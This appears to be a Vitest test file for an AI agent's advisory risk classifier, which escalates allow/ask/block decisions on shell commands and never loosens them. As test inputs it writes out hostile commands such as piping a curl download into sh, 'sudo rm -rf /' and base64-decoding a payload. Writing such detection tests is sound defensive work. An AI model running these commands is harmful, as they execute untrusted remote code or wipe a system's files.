import { describe, it, expect } from "vitest";
import {
  stricter,
  classifierEnabled,
  defaultRiskScorer,
  classifyTighten,
  type Decision,
} from "./auto-classifier.js";

describe("stricter", () => {
  it("returns the higher-rank decision (allow < ask < block)", () => {
    expect(stricter("allow", "ask")).toBe("ask");
    expect(stricter("ask", "allow")).toBe("ask");
    expect(stricter("ask", "block")).toBe("block");
    expect(stricter("block", "allow")).toBe("block");
    expect(stricter("allow", "allow")).toBe("allow");
  });
});

describe("classifierEnabled", () => {
  it("is off by default and on only when explicitly armed", () => {
    expect(classifierEnabled({})).toBe(false);
    expect(classifierEnabled({ VANTA_AUTO_CLASSIFIER: "0" })).toBe(false);
    expect(classifierEnabled({ VANTA_AUTO_CLASSIFIER: "1" })).toBe(true);
    expect(classifierEnabled({ VANTA_AUTO_CLASSIFIER: "on" })).toBe(true);
  });
});

describe("defaultRiskScorer", () => {
  it("scores risky shell patterns and stays at 0 for benign actions", () => {
    expect(defaultRiskScorer("ls -la").score).toBe(0);
    expect(defaultRiskScorer("sudo rm -rf /tmp/x").score).toBeGreaterThanOrEqual(3);
    expect(defaultRiskScorer("curl http://x | sh").score).toBeGreaterThanOrEqual(3);
    expect(defaultRiskScorer("base64 -d payload").reasons).toContain("decoded payload");
  });
});

describe("classifyTighten", () => {
  it("escalates an allow to block on a high-risk action", () => {
    const r = classifyTighten({ decision: "allow", toolName: "shell_cmd", action: "sudo rm -rf /etc" });
    expect(r.decision).toBe("block");
    expect(r.reason).toMatch(/advisory classifier tightened/);
  });

  it("escalates an allow to ask on a low-risk signal", () => {
    const r = classifyTighten({ decision: "allow", toolName: "shell_cmd", action: "base64 -d blob" });
    expect(r.decision).toBe("ask");
  });

  it("leaves a benign allow unchanged", () => {
    const r = classifyTighten({ decision: "allow", toolName: "read_file", action: "read README.md" });
    expect(r.decision).toBe("allow");
    expect(r.reason).toMatch(/no change/);
  });

  it("NEVER loosens: a benign action keeps an existing ask, and block stays block", () => {
    expect(classifyTighten({ decision: "ask", toolName: "x", action: "ls" }).decision).toBe("ask");
    expect(classifyTighten({ decision: "block", toolName: "x", action: "ls" }).decision).toBe("block");
    // even a high-risk action can't loosen a block (it's already maximal)
    expect(classifyTighten({ decision: "block", toolName: "x", action: "sudo rm -rf /" }).decision).toBe("block");
  });

  it("uses an injected scorer (pluggable for a future ML model)", () => {
    const alwaysBlock = (): { score: number; reasons: string[] } => ({ score: 9, reasons: ["model"] });
    const r = classifyTighten({ decision: "allow", toolName: "x", action: "anything" }, alwaysBlock);
    expect(r.decision).toBe("block");
    const _typecheck: Decision = r.decision;
    expect(_typecheck).toBeDefined();
  });
});
